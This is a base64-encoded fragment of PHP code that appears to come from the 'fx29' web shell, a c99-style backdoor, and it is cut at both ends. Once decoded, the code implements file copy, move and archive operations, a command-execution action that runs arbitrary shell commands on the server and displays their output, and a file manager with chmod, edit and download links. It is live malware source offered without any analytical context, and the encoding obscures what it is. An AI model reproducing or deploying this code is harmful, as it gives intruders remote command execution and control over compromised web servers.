KZWxzZSB7CiAgaWYgKCRhY3QgPT0gImNvcHkiKSB7JGVyciA9ICIiOyAkc2Vzc19kYXRhWyJjb3B5Il0gPSBhcnJheV9tZXJnZSgkc2Vzc19kYXRhWyJjb3B5Il0sJGFjdGJveCk7IGZ4Mjlfc2Vzc19wdXQoJHNlc3NfZGF0YSk7ICRhY3QgPSAibHMiOyB9CiAgZWxzZWlmICgkYWN0ID09ICJjdXQiKSB7JHNlc3NfZGF0YVsiY3V0Il0gPSBhcnJheV9tZXJnZSgkc2Vzc19kYXRhWyJjdXQiXSwkYWN0Ym94KTsgZngyOV9zZXNzX3B1dCgkc2Vzc19kYXRhKTsgJGFjdCA9ICJscyI7fQogIGVsc2VpZiAoJGFjdCA9PSAidW5zZWxlY3QiKSB7Zm9yZWFjaCAoJHNlc3NfZGF0YVsiY29weSJdIGFzICRrPT4kdikge2lmIChpbl9hcnJheSgkdiwkYWN0Ym94KSkge3Vuc2V0KCRzZXNzX2RhdGFbImNvcHkiXVska10pO319IGZvcmVhY2ggKCRzZXNzX2RhdGFbImN1dCJdIGFzICRrPT4kdikge2lmIChpbl9hcnJheSgkdiwkYWN0Ym94KSkge3Vuc2V0KCRzZXNzX2RhdGFbImN1dCJdWyRrXSk7fX0gZngyOV9zZXNzX3B1dCgkc2Vzc19kYXRhKTsgJGFjdCA9ICJscyI7fQogIGlmICgkYWN0ZW1wdHlidWZmKSB7JHNlc3NfZGF0YVsiY29weSJdID0gJHNlc3NfZGF0YVsiY3V0Il0gPSBhcnJheSgpOyBmeDI5X3Nlc3NfcHV0KCRzZXNzX2RhdGEpO30KICBlbHNlaWYgKCRhY3RwYXN0ZWJ1ZmYpIHsKICAgICRwc3RlcnIgPSAiIjsKICAgIGZvcmVhY2goJHNlc3NfZGF0YVsiY29weSJdIGFzICRrPT4kdikgewogICAgICAkdG8gPSAkZC5iYXNlbmFtZSgkdik7CiAgICAgIGlmICghZnNfY29weV9vYmooJHYsJHRvKSkgeyRwc3RlcnIgLj0gIkNhbid0IGNvcHkgIi4kdi4iIHRvICIuJHRvLiIhPGJyPiI7fQogICAgICBpZiAoJGNvcHlfdW5zZXQpIHt1bnNldCgkc2Vzc19kYXRhWyJjb3B5Il1bJGtdKTt9CiAgICB9CiAgICBmb3JlYWNoKCRzZXNzX2RhdGFbImN1dCJdIGFzICRrPT4kdikgewogICAgICAkdG8gPSAkZC5iYXNlbmFtZSgkdik7CiAgICAgIGlmICghZnNfbW92ZV9vYmooJHYsJHRvKSkgeyRwc3RlcnIgLj0gIkNhbid0IG1vdmUgIi4kdi4iIHRvICIuJHRvLiIhPGJyPiI7fQogICAgICB1bnNldCgkc2Vzc19kYXRhWyJjdXQiXVska10pOwogICAgfQogICAgZngyOV9zZXNzX3B1dCgkc2Vzc19kYXRhKTsKICAgIGlmICghZW1wdHkoJHBzdGVycikpIHtlY2hvICI8Yj5QYXN0aW5nIHdpdGggZXJyb3JzOjwvYj48YnI+Ii4kcHN0ZXJyO30KICAgICRhY3QgPSAibHMiOwogIH0KICBlbHNlaWYgKCRhY3RhcmNidWZmKSB7CiAgICAkYXJjZXJyID0gIiI7CiAgICBpZiAoc3Vic3RyKCRhY3RhcmNidWZmX3BhdGgsLTcsNykgPT0gIi50YXIuZ3oiKSB7JGV4dCA9ICIudGFyLmd6Ijt9CiAgICBlbHNlIHskZXh0ID0gIi50YXIuZ3oiO30KICAgIGlmICgkZXh0ID09ICIudGFyLmd6IikgeyRjbWRsaW5lID0gInRhciBjZnp2Ijt9CiAgICAkY21kbGluZSAuPSAiICIuJGFjdGFyY2J1ZmZfcGF0aDsKICAgICRvYmplY3RzID0gYXJyYXlfbWVyZ2UoJHNlc3NfZGF0YVsiY29weSJdLCRzZXNzX2RhdGFbImN1dCJdKTsKICAgIGZvcmVhY2goJG9iamVjdHMgYXMgJHYpIHsKICAgICAgJHYgPSBzdHJfcmVwbGFjZSgiXFwiLERJUkVDVE9SWV9TRVBBUkFUT1IsJHYpOwogICAgICBpZiAoc3Vic3RyKCR2LDAsc3RybGVuKCRkKSkgPT0gJGQpIHskdiA9IGJhc2VuYW1lKCR2KTt9CiAgICAgIGlmIChpc19kaXIoJHYpKSB7CiAgICAgICAgaWYgKHN1YnN0cigkdiwtMSkgIT0gRElSRUNUT1JZX1NFUEFSQVRPUikgeyR2IC49IERJUkVDVE9SWV9TRVBBUkFUT1I7fQogICAgICAgICR2IC49ICIqIjsKICAgICAgfQogICAgICAkY21kbGluZSAuPSAiICIuJHY7CiAgICB9CiAgICAkdG1wID0gcmVhbHBhdGgoIi4iKTsKICAgIGNoZGlyKCRkKTsKICAgICRyZXQgPSBmeDI5ZXhlYygkY21kbGluZSk7CiAgICBjaGRpcigkdG1wKTsKICAgIGlmIChlbXB0eSgkcmV0KSkgeyRhcmNlcnIgLj0gIkNhbid0IGNhbGwgYXJjaGl2YXRvciAoIi5odG1sc3BlY2lhbGNoYXJzKHN0cjJtaW5pKCRjbWRsaW5lLDYwKSkuIikhPGJyPiI7fQogICAgJHJldCA9IHN0cl9yZXBsYWNlKCJcclxuIiwiXG4iLCRyZXQpOwogICAgJHJldCA9IGV4cGxvZGUoIlxuIiwkcmV0KTsKICAgIGlmICgkY29weV91bnNldCkge2ZvcmVhY2goJHNlc3NfZGF0YVsiY29weSJdIGFzICRrPT4kdikge3Vuc2V0KCRzZXNzX2RhdGFbImNvcHkiXVska10pO319CiAgICBmb3JlYWNoKCRzZXNzX2RhdGFbImN1dCJdIGFzICRrPT4kdikgewogICAgICBpZiAoaW5fYXJyYXkoJHYsJHJldCkpIHtmc19ybW9iaigkdik7fQogICAgICB1bnNldCgkc2Vzc19kYXRhWyJjdXQiXVska10pOwogICAgfQogICAgZngyOV9zZXNzX3B1dCgkc2Vzc19kYXRhKTsKICAgIGlmICghZW1wdHkoJGFyY2VycikpIHtlY2hvICI8Yj5BcmNoaXZhdGlvbiBlcnJvcnM6PC9iPjxicj4iLiRhcmNlcnI7fQogICAgJGFjdCA9ICJscyI7CiAgfQogIGVsc2VpZiAoJGFjdHBhc3RlYnVmZikgewogICAgJHBzdGVyciA9ICIiOwogICAgZm9yZWFjaCgkc2Vzc19kYXRhWyJjb3B5Il0gYXMgJGs9PiR2KSB7CiAgICAgICR0byA9ICRkLmJhc2VuYW1lKCR2KTsKICAgICAgaWYgKCFmc19jb3B5X29iaigkdiwkZCkpIHskcHN0ZXJyIC49ICJDYW4ndCBjb3B5ICIuJHYuIiB0byAiLiR0by4iITxicj4iO30KICAgICAgaWYgKCRjb3B5X3Vuc2V0KSB7dW5zZXQoJHNlc3NfZGF0YVsiY29weSJdWyRrXSk7fQogICAgfQogICAgZm9yZWFjaCgkc2Vzc19kYXRhWyJjdXQiXSBhcyAkaz0+JHYpIHsKICAgICAgJHRvID0gJGQuYmFzZW5hbWUoJHYpOwogICAgICBpZiAoIWZzX21vdmVfb2JqKCR2LCRkKSkgeyRwc3RlcnIgLj0gIkNhbid0IG1vdmUgIi4kdi4iIHRvICIuJHRvLiIhPGJyPiI7fQogICAgICB1bnNldCgkc2Vzc19kYXRhWyJjdXQiXVska10pOwogICAgfQogICAgZngyOV9zZXNzX3B1dCgkc2Vzc19kYXRhKTsKICAgIGlmICghZW1wdHkoJHBzdGVycikpIHtlY2hvICI8Yj5FcnJvciBwYXN0aW5nOjwvYj48YnI+Ii4kcHN0ZXJyO30KICAgICRhY3QgPSAibHMiOwogIH0KfQppZiAoJGFjdCA9PSAiY21kIikgewogIEBjaGRpcigkY2hkaXIpOwogIGlmICghZW1wdHkoJHN1Ym1pdCkpIHsKICAgIGVjaG8gIjxkaXYgY2xhc3M9YmFyaGVhZGVyPi46IFJlc3VsdHMgb2YgRXhlY3V0aW9uIDouPC9kaXY+XG4iOwogICAgJG9sZGRpciA9IHJlYWxwYXRoKCIuIik7CiAgICBAY2hkaXIoJGQpOwogICAgJHJldCA9IGZ4MjlleGVjKCRjbWQpOwogICAgJHJldCA9IGNvbnZlcnRfY3lyX3N0cmluZygkcmV0LCJkIiwidyIpOwogICAgaWYgKCRjbWRfdHh0KSB7CiAgICAgICRyb3dzID0gY291bnQoZXhwbG9kZSgiXG4iLCRyZXQpKSsxOwogICAgICBpZiAoJHJvd3MgPCAxMCkgeyAkcm93cyA9IDEwOyB9IGVsc2UgeyAkcm93cyA9IDMwOyB9CiAgICAgICRjb2xzID0gMTMwOwogICAgICBlY2hvICI8dGV4dGFyZWEgY2xhc3M9c2hlbGwgY29scz1cIiRjb2xzXCIgcm93cz1cIiRyb3dzXCIgcmVhZG9ubHk+Ii5odG1sc3BlY2lhbGNoYXJzKCRyZXQpLiI8L3RleHRhcmVhPlxuIjsKICAgICAgLy9lY2hvICI8ZGl2IGFsaWduPWxlZnQ+PHByZT4iLmh0bWxzcGVjaWFsY2hhcnMoJHJldCkuIjwvcHJlPjwvZGl2PiI7CiAgICB9CiAgICBlbHNlIHsgZWNobyAkcmV0LiI8YnI+IjsgfQogICAgQGNoZGlyKCRvbGRkaXIpOwogIH0KfQppZiAoJGFjdCA9PSAibHMiKSB7CiAgaWYgKGNvdW50KCRsc19hcnIpID4gMCkgeyAkbGlzdCA9ICRsc19hcnI7IH0KICBlbHNlIHsKICAgICRsaXN0ID0gYXJyYXkoKTsKICAgIGlmICgkaCA9IEBvcGVuZGlyKCRkKSkgewogICAgICB3aGlsZSAoKCRvID0gcmVhZGRpcigkaCkpICE9PSBGQUxTRSkgeyRsaXN0W10gPSAkZC4kbzt9CiAgICAgIGNsb3NlZGlyKCRoKTsKICAgIH0KICB9CiAgaWYgKGNvdW50KCRsaXN0KSA9PSAwKSB7IGVjaG8gIjxkaXYgY2xhc3M9ZnhlcnJtc2c+Q2FuJ3Qgb3BlbiBmb2xkZXIgKCIuaHRtbHNwZWNpYWxjaGFycygkZCkuIikhPC9kaXY+Ijt9CiAgZWxzZSB7CiAgICAkb2JqZWN0cyA9IGFycmF5KCk7CiAgICAkdmQgPSAiZiI7IC8vVmlld2luZyBtb2RlCiAgICBpZiAoJHZkID09ICJmIikgewogICAgICAkb2JqZWN0c1siaGVhZCJdID0gYXJyYXkoKTsKICAgICAgJG9iamVjdHNbImZvbGRlcnMiXSA9IGFycmF5KCk7CiAgICAgICRvYmplY3RzWyJsaW5rcyJdID0gYXJyYXkoKTsKICAgICAgJG9iamVjdHNbImZpbGVzIl0gPSBhcnJheSgpOwogICAgICBmb3JlYWNoICgkbGlzdCBhcyAkdikgewogICAgICAgICRvID0gYmFzZW5hbWUoJHYpOwogICAgICAgICRyb3cgPSBhcnJheSgpOwogICAgICAgIGlmICgkbyA9PSAiLiIpIHskcm93W10gPSAkZC4kbzsgJHJvd1tdID0gIkNVUkRJUiI7fQogICAgICAgIGVsc2VpZiAoJG8gPT0gIi4uIikgeyRyb3dbXSA9ICRkLiRvOyAkcm93W10gPSAiVVBESVIiO30KICAgICAgICBlbHNlaWYgKGlzX2RpcigkdikpIHsKICAgICAgICAgIGlmIChpc19saW5rKCR2KSkgeyR0eXBlID0gIkxJTksiO30KICAgICAgICAgIGVsc2UgeyR0eXBlID0gIkRJUiI7fQogICAgICAgICAgJHJvd1tdID0gJHY7CiAgICAgICAgICAkcm93W10gPSAkdHlwZTsKICAgICAgICB9CiAgICAgICAgZWxzZWlmKGlzX2ZpbGUoJHYpKSB7JHJvd1tdID0gJHY7ICRyb3dbXSA9IGZpbGVzaXplKCR2KTt9CiAgICAgICAgJHJvd1tdID0gZmlsZW10aW1lKCR2KTsKICAgICAgICBpZiAoISR3aW4pIHsKICAgICAgICAgICRvdyA9IHBvc2l4X2dldHB3dWlkKGZpbGVvd25lcigkdikpOwogICAgICAgICAgJGdyID0gcG9zaXhfZ2V0Z3JnaWQoZmlsZWdyb3VwKCR2KSk7CiAgICAgICAgICAkcm93W10gPSAoJG93WyJuYW1lIl0/JG93WyJuYW1lIl06ZmlsZW93bmVyKCR2KSkuIi8iLigkZ3JbIm5hbWUiXT8kZ3JbIm5hbWUiXTpmaWxlZ3JvdXAoJHYpKTsKICAgICAgICB9CiAgICAgICAgJHJvd1tdID0gZmlsZXBlcm1zKCR2KTsKICAgICAgICBpZiAoKCRvID09ICIuIikgb3IgKCRvID09ICIuLiIpKSB7JG9iamVjdHNbImhlYWQiXVtdID0gJHJvdzt9CiAgICAgICAgZWxzZWlmIChpc19saW5rKCR2KSkgeyRvYmplY3RzWyJsaW5rcyJdW10gPSAkcm93O30KICAgICAgICBlbHNlaWYgKGlzX2RpcigkdikpIHskb2JqZWN0c1siZm9sZGVycyJdW10gPSAkcm93O30KICAgICAgICBlbHNlaWYgKGlzX2ZpbGUoJHYpKSB7JG9iamVjdHNbImZpbGVzIl1bXSA9ICRyb3c7fQogICAgICAgICRpKys7CiAgICAgIH0KICAgICAgJHJvdyA9IGFycmF5KCk7CiAgICAgICRyb3dbXSA9ICI8Yj5OYW1lPC9iPiI7CiAgICAgICRyb3dbXSA9ICI8Yj5TaXplPC9iPiI7CiAgICAgICRyb3dbXSA9ICI8Yj5EYXRlIE1vZGlmaWVkPC9iPiI7CiAgICAgIGlmICghJHdpbikgeyRyb3dbXSA9ICI8Yj5Pd25lci9Hcm91cDwvYj4iO30KICAgICAgJHJvd1tdID0gIjxiPlBlcm1zPC9iPiI7CiAgICAgICRyb3dbXSA9ICI8Yj5BY3Rpb248L2I+IjsKICAgICAgJHBhcnNlc29ydCA9IHBhcnNlc29ydCgkc29ydCk7CiAgICAgICRzb3J0ID0gJHBhcnNlc29ydFswXS4kcGFyc2Vzb3J0WzFdOwogICAgICAkayA9ICRwYXJzZXNvcnRbMF07CiAgICAgIGlmICgkcGFyc2Vzb3J0WzFdICE9ICJhIikgeyRwYXJzZXNvcnRbMV0gPSAiZCI7fQogICAgICAkeSA9ICIgPGEgaHJlZj1cIiIuJHN1cmwuImFjdD0iLiRkc3BhY3QuIiZkPSIudXJsZW5jb2RlKCRkKS4iJnNvcnQ9Ii4kay4oJHBhcnNlc29ydFsxXSA9PSAiYSI/ImQiOiJhIikuIlwiPiI7CiAgICAgICR5IC49ICI8aW1nIHNyYz1cIiIuJHN1cmwuImFjdD1pbWcmaW1nPXNvcnRfIi4oJHNvcnRbMV0gPT0gImEiPyJhc2MiOiJkZXNjIikuIlwiIGhlaWdodD1cIjlcIiB3aWR0aD1cIjE0XCIgYWx0PVwiIi4oJHBhcnNlc29ydFsxXSA9PSAiYSI/IkFzYy4iOiJEZXNjIikuIlwiIGJvcmRlcj1cIjBcIj48L2E+IjsKICAgICAgJHJvd1ska10gLj0gJHk7CiAgICAgIGZvcigkaT0wOyRpPGNvdW50KCRyb3cpLTE7JGkrKykgewogICAgICAgIGlmICgkaSAhPSAkaykgeyRyb3dbJGldID0gIjxhIGhyZWY9XCIiLiRzdXJsLiJhY3Q9Ii4kZHNwYWN0LiImZD0iLnVybGVuY29kZSgkZCkuIiZzb3J0PSIuJGkuJHBhcnNlc29ydFsxXS4iXCI+Ii4kcm93WyRpXS4iPC9hPiI7fQogICAgICB9CiAgICAgICR2ID0gJHBhcnNlc29ydFswXTsKICAgICAgdXNvcnQoJG9iamVjdHNbImZvbGRlcnMiXSwgInRhYnNvcnQiKTsKICAgICAgdXNvcnQoJG9iamVjdHNbImxpbmtzIl0sICJ0YWJzb3J0Iik7CiAgICAgIHVzb3J0KCRvYmplY3RzWyJmaWxlcyJdLCAidGFic29ydCIpOwogICAgICBpZiAoJHBhcnNlc29ydFsxXSA9PSAiZCIpIHsKICAgICAgICAkb2JqZWN0c1siZm9sZGVycyJdID0gYXJyYXlfcmV2ZXJzZSgkb2JqZWN0c1siZm9sZGVycyJdKTsKICAgICAgICAkb2JqZWN0c1siZmlsZXMiXSA9IGFycmF5X3JldmVyc2UoJG9iamVjdHNbImZpbGVzIl0pOwogICAgICB9CiAgICAgICRvYmplY3RzID0gYXJyYXlfbWVyZ2UoJG9iamVjdHNbImhlYWQiXSwkb2JqZWN0c1siZm9sZGVycyJdLCRvYmplY3RzWyJsaW5rcyJdLCRvYmplY3RzWyJmaWxlcyJdKTsKICAgICAgJHRhYiA9IGFycmF5KCk7CiAgICAgICR0YWJbImNvbHMiXSA9IGFycmF5KCRyb3cpOwogICAgICAkdGFiWyJoZWFkIl0gPSBhcnJheSgpOwogICAgICAkdGFiWyJmb2xkZXJzIl0gPSBhcnJheSgpOwogICAgICAkdGFiWyJsaW5rcyJdID0gYXJyYXkoKTsKICAgICAgJHRhYlsiZmlsZXMiXSA9IGFycmF5KCk7CiAgICAgICRpID0gMDsKICAgICAgZm9yZWFjaCAoJG9iamVjdHMgYXMgJGEpIHsKICAgICAgICAkdiA9ICRhWzBdOwogICAgICAgICRvID0gYmFzZW5hbWUoJHYpOwogICAgICAgICRkaXIgPSBkaXJuYW1lKCR2KTsKICAgICAgICBpZiAoJGRpc3BfZnVsbHBhdGgpIHskZGlzcHBhdGggPSAkdjt9CiAgICAgICAgZWxzZSB7JGRpc3BwYXRoID0gJG87fQogICAgICAgICRkaXNwcGF0aCA9IHN0cjJtaW5pKCRkaXNwcGF0aCw2MCk7CiAgICAgICAgaWYgKGluX2FycmF5KCR2LCRzZXNzX2RhdGFbImN1dCJdKSkgeyRkaXNwcGF0aCA9ICI8c3RyaWtlPiIuJGRpc3BwYXRoLiI8L3N0cmlrZT4iO30KICAgICAgICBlbHNlaWYgKGluX2FycmF5KCR2LCRzZXNzX2RhdGFbImNvcHkiXSkpIHskZGlzcHBhdGggPSAiPHU+Ii4kZGlzcHBhdGguIjwvdT4iO30KICAgICAgICBmb3JlYWNoICgkcmVneHBfaGlnaGxpZ2h0IGFzICRyKSB7CiAgICAgICAgICBpZiAoZXJlZygkclswXSwkbykpIHsKICAgICAgICAgICAgaWYgKCghaXNfbnVtZXJpYygkclsxXSkpIG9yICgkclsxXSA+IDMpKSB7JHJbMV0gPSAwOyBvYl9jbGVhbigpOyBlY2hvICJXYXJuaW5nISBDb25maWd1cmF0aW9uIGVycm9yIGluIFwkcmVneHBfaGlnaGxpZ2h0WyIuJGsuIl1bMF0gLSB1bmtub3duIGNvbW1hbmQuIjsgZngyOXNoZXhpdCgpO30KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgJHJbMV0gPSByb3VuZCgkclsxXSk7CiAgICAgICAgICAgICAgJGlzZGlyID0gaXNfZGlyKCR2KTsKICAgICAgICAgICAgICBpZiAoKCRyWzFdID09IDApIG9yICgoJHJbMV0gPT0gMSkgYW5kICEkaXNkaXIpIG9yICgoJHJbMV0gPT0gMikgYW5kICEkaXNkaXIpKSB7CiAgICAgICAgICAgICAgICBpZiAoZW1wdHkoJHJbMl0pKSB7JHJbMl0gPSAiPGI+IjsgJHJbM10gPSAiPC9iPiI7fQogICAgICAgICAgICAgICAgJGRpc3BwYXRoID0gJHJbMl0uJGRpc3BwYXRoLiRyWzNdOwogICAgICAgICAgICAgICAgaWYgKCRyWzRdKSB7YnJlYWs7fQogICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkdW8gPSB1cmxlbmNvZGUoJG8pOwogICAgICAgICR1ZCA9IHVybGVuY29kZSgkZGlyKTsKICAgICAgICAkdXYgPSB1cmxlbmNvZGUoJHYpOwogICAgICAgICRyb3cgPSBhcnJheSgpOwogICAgICAgIGlmICgkbyA9PSAiLiIpIHsKICAgICAgICAgICRyb3dbXSA9ICI8YSBocmVmPVwiIi4kc3VybC4iYWN0PSIuJGRzcGFjdC4iJmQ9Ii51cmxlbmNvZGUocmVhbHBhdGgoJGQuJG8pKS4iJnNvcnQ9Ii4kc29ydC4iXCI+PGltZyBzcmM9XCIiLiRzdXJsLiJhY3Q9aW1nJmltZz1zbWFsbF9kaXJcIiBib3JkZXI9XCIwXCI+Jm5ic3A7Ii4kby4iPC9hPiI7CiAgICAgICAgICAkcm93W10gPSAiQ1VSRElSIjsKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkbyA9PSAiLi4iKSB7CiAgICAgICAgICAkcm93W10gPSAiPGEgaHJlZj1cIiIuJHN1cmwuImFjdD0iLiRkc3BhY3QuIiZkPSIudXJsZW5jb2RlKHJlYWxwYXRoKCRkLiRvKSkuIiZzb3J0PSIuJHNvcnQuIlwiPjxpbWcgc3JjPVwiIi4kc3VybC4iYWN0PWltZyZpbWc9ZXh0X2xua1wiIGJvcmRlcj1cIjBcIj4mbmJzcDsiLiRvLiI8L2E+IjsKICAgICAgICAgICRyb3dbXSA9ICJVUERJUiI7CiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoaXNfZGlyKCR2KSkgewogICAgICAgICAgaWYgKGlzX2xpbmsoJHYpKSB7CiAgICAgICAgICAgICRkaXNwcGF0aCAuPSAiID0+ICIucmVhZGxpbmsoJHYpOwogICAgICAgICAgICAkdHlwZSA9ICJMSU5LIjsKICAgICAgICAgICAgJHJvd1tdID0gIjxhIGhyZWY9XCIiLiRzdXJsLiJhY3Q9bHMmZD0iLiR1di4iJnNvcnQ9Ii4kc29ydC4iXCI+PGltZyBzcmM9XCIiLiRzdXJsLiJhY3Q9aW1nJmltZz1leHRfbG5rXCIgYm9yZGVyPVwiMFwiPiZuYnNwO1siLiRkaXNwcGF0aC4iXTwvYT4iOwogICAgICAgICAgfQogICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICR0eXBlID0gIkRJUiI7CiAgICAgICAgICAgICRyb3dbXSA9ICAiPGEgaHJlZj1cIiIuJHN1cmwuImFjdD1scyZkPSIuJHV2LiImc29ydD0iLiRzb3J0LiJcIj48aW1nIHNyYz1cIiIuJHN1cmwuImFjdD1pbWcmaW1nPXNtYWxsX2RpclwiIGJvcmRlcj1cIjBcIj4mbmJzcDtbIi4kZGlzcHBhdGguIl08L2E+IjsKICAgICAgICAgIH0KICAgICAgICAgICRyb3dbXSA9ICR0eXBlOwogICAgICAgIH0KICAgICAgICBlbHNlaWYoaXNfZmlsZSgkdikpIHsKICAgICAgICAgICRleHQgPSBleHBsb2RlKCIuIiwkbyk7CiAgICAgICAgICAkYyA9IGNvdW50KCRleHQpLTE7CiAgICAgICAgICAkZXh0ID0gJGV4dFskY107CiAgICAgICAgICAkZXh0ID0gc3RydG9sb3dlcigkZXh0KTsKICAgICAgICAgICRyb3dbXSA9ICAiPGEgaHJlZj1cIiIuJHN1cmwuImFjdD1mJmY9Ii4kdW8uIiZkPSIuJHVkLiJcIj48aW1nIHNyYz1cIiIuJHN1cmwuImFjdD1pbWcmaW1nPWV4dF8iLiRleHQuIlwiIGJvcmRlcj1cIjBcIj4mbmJzcDsiLiRkaXNwcGF0aC4iPC9hPiI7CiAgICAgICAgICAkcm93W10gPSB2aWV3X3NpemUoJGFbMV0pOwogICAgICAgIH0KICAgICAgICAkcm93W10gPSBAZGF0ZSgiZC5tLlkgSDppOnMiLCRhWzJdKTsKICAgICAgICBpZiAoISR3aW4pIHsgJHJvd1tdID0gJGFbM107IH0KICAgICAgICAkcm93W10gPSAiPGEgaHJlZj1cIiIuJHN1cmwuImFjdD1jaG1vZCZmPSIuJHVvLiImZD0iLiR1ZC4iXCI+PGI+Ii52aWV3X3Blcm1zX2NvbG9yKCR2KS4iPC9iPjwvYT4iOwogICAgICAgIGlmICgkbyA9PSAiLiIpIHskY2hlY2tib3ggPSAiPGlucHV0IHR5cGU9XCJjaGVja2JveFwiIG5hbWU9XCJhY3Rib3hbXVwiIG9uY2xpY2s9XCJsc19yZXZlcnNlX2FsbCgpO1wiPiI7ICRpLS07fQogICAgICAgIGVsc2UgeyRjaGVja2JveCA9ICI8aW5wdXQgdHlwZT1cImNoZWNrYm94XCIgbmFtZT1cImFjdGJveFtdXCIgaWQ9XCJhY3Rib3giLiRpLiJcIiB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkdikuIlwiPiI7fQogICAgICAgIGlmIChpc19kaXIoJHYpKSB7JHJvd1tdID0gIjxhIGhyZWY9XCIiLiRzdXJsLiJhY3Q9ZCZkPSIuJHV2LiJcIj48aW1nIHNyYz1cIiIuJHN1cmwuImFjdD1pbWcmaW1nPWV4dF9kaXpcIiBhbHQ9XCJJbmZvXCIgYm9yZGVyPVwiMFwiPjwvYT4mbmJzcDsiLiRjaGVja2JveDt9CiAgICAgICAgZWxzZSB7JHJvd1tdID0gIjxhIGhyZWY9XCIiLiRzdXJsLiJhY3Q9ZiZmPSIuJHVvLiImZnQ9aW5mbyZkPSIuJHVkLiJcIj48aW1nIHNyYz1cIiIuJHN1cmwuImFjdD1pbWcmaW1nPWV4dF9kaXpcIiBhbHQ9XCJJbmZvXCIgaGVpZ2h0PVwiMTZcIiB3aWR0aD1cIjE2XCIgYm9yZGVyPVwiMFwiPjwvYT4mbmJzcDs8YSBocmVmPVwiIi4kc3VybC4iYWN0PWYmZj0iLiR1by4iJmZ0PWVkaXQmZD0iLiR1ZC4iXCI+PGltZyBzcmM9XCIiLiRzdXJsLiJhY3Q9aW1nJmltZz1jaGFuZ2VcIiBhbHQ9XCJFZGl0XCIgaGVpZ2h0PVwiMTZcIiB3aWR0aD1cIjE5XCIgYm9yZGVyPVwiMFwiPjwvYT4mbmJzcDs8YSBocmVmPVwiIi4kc3VybC4iYWN0PWYmZj0iLiR1by4iJmZ0PWRvd25sb2FkJmQ9Ii4kdWQuIlwiPjxpbWcgc3JjPVwiIi4kc3VybC4iYWN0PWltZyZpbWc9ZG93bmxvYWRcIiBhbHQ9XCJEb3dubG9hZFwiIGJvcmRlcj1cIjBcIj48L2E+Jm5ic3A7Ii4kY2hlY2tib3g7fQogICAgICAgIGlmICgoJG8gPT0gIi4iKSBvciAoJG8gPT0gIi4uIikpIHskdGFiWyJoZWFkIl1bXSA9ICRyb3c7fQogICAgICAgIGVsc2VpZiAoaXNfbGluaygkdikpIHskdGFiWyJsaW5rcyJdW10gPSAkcm93O30KICAgICAgICBlbHNlaWYgKGlzX2RpcigkdikpIHskdGFiWyJmb2xkZXJzIl1bXSA9ICRyb3c7fQogICAgICAgIGVsc2VpZiAoaXNfZmlsZSgkdikpIHskdGFiWyJmaWxlcyJdW10gPSAkcm93O30KICAgICAgICAkaSsrOwogICAgICB9CiAgICB9CiAgICAvLyBDb21waWxpbmcgdGFibGUKICAgICR0YWJsZSA9IGFycmF5X21lcmdlKCR0YWJbImNvbHMiXSwkdGFiWyJoZWFkIl0sJHRhYlsiZm9sZGVycyJdLCR0YWJbImxpbmtzIl0sJHRhYlsiZmlsZXMiXSk7CiAgICBlY2hvICI8ZGl2IGNsYXNzPWJhcmhlYWRlcj4uOiAiOwogICAgaWYgKCFlbXB0eSgkZnhfaW5mb2hlYWQpKSB7IGVjaG8gJGZ4X2luZm9oZWFkOyB9CiAgICBlbHNlIHsgZWNobyAiRGlyZWN0b3J5IExpc3QgKCIuY291bnQoJHRhYlsiZmlsZXMiXSkuIiBmaWxlcyBhbmQgIi4oY291bnQoJHRhYlsiZm9sZGVycyJdKStjb3VudCgkdGFiWyJsaW5rcyJdKSkuIiBmb2xkZXJzKSI7IH0KICAgIGVjaG8gIiA6LjwvZGl2PlxuIjsKICAgIGVjaG8gIjxmb3JtIGFjdGlvbj1cIiIuJHN1cmwuIlwiIG1ldGhvZD1QT1NUIG5hbWU9XCJsc19mb3JtXCI+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YWN0IHZhbHVlPVwiIi4kZHNwYWN0LiJcIj48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kIHZhbHVlPSIuJGQuIj4iLgogICAgICAgICAiPHRhYmxlIGNsYXNzPWV4cGxvcmVyPiI7CiAgICBmb3JlYWNoKCR0YWJsZSBhcyAkcm93KSB7CiAgICAgIGVjaG8gIjx0cj4iOwogICAgICBmb3JlYWNoKCRyb3cgYXMgJHYpIHtlY2hvICI8dGQ+Ii4kdi4iPC90ZD4iO30KICAgICAgZWNobyAiPC90cj5cclxuIjsKICAgIH0KICAgIGVjaG8gIjwvdGFibGU+Ii4KICAgICAgICAgIjxzY3JpcHQ+Ii4KICAgICAgICAgImZ1bmN0aW9uIGxzX3NldGNoZWNrYm94YWxsKHN0YXR1cykgeyIuCiAgICAgICAgICIgdmFyIGlkID0gMTsgdmFyIG51bSA9ICIuKGNvdW50KCR0YWJsZSktMikuIjsiLgogICAgICAgICAiIHdoaWxlIChpZCA8PSBudW0pIHsgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FjdGJveCcraWQpLmNoZWNrZWQgPSBzdGF0dXM7IGlkKys7IH0iLgogICAgICAgICAifSIuCiAgICAgICAgICJmdW5jdGlvbiBsc19yZXZlcnNlX2FsbCgpIHsiLgogICAgICAgICAiIHZhciBpZCA9IDE7IHZhciBudW0gPSAiLihjb3VudCgkdGFibGUpLTIpLiI7Ii4KICAgICAgICAgIiB3aGlsZSAoaWQgPD0gbnVtKSB7IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhY3Rib3gnK2lkKS5jaGVja2VkID0gIWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhY3Rib3gnK2lkKS5jaGVja2VkOyBpZCsrOyB9Ii4KICAgICAgICAgIn0iLgogICAgICAgICAiPC9zY3JpcHQ+Ii4KICAgICAgICAgIjxkaXYgYWxpZ249XCJyaWdodFwiPiIuCiAgICAgICAgICI8aW5wdXQgdHlwZT1cImJ1dHRvblwiIG9uY2xpY2s9XCJsc19zZXRjaGVja2JveGFsbCh0cnVlKTtcIiB2YWx1ZT1cIlNlbGVjdCBhbGxcIj4mbmJzcDsmbmJzcDs8aW5wdXQgdHlwZT1cImJ1dHRvblwiIG9uY2xpY2s9XCJsc19zZXRjaGVja2JveGFsbChmYWxzZSk7XCIgdmFsdWU9XCJVbnNlbGVjdCBhbGxcIj4iLgo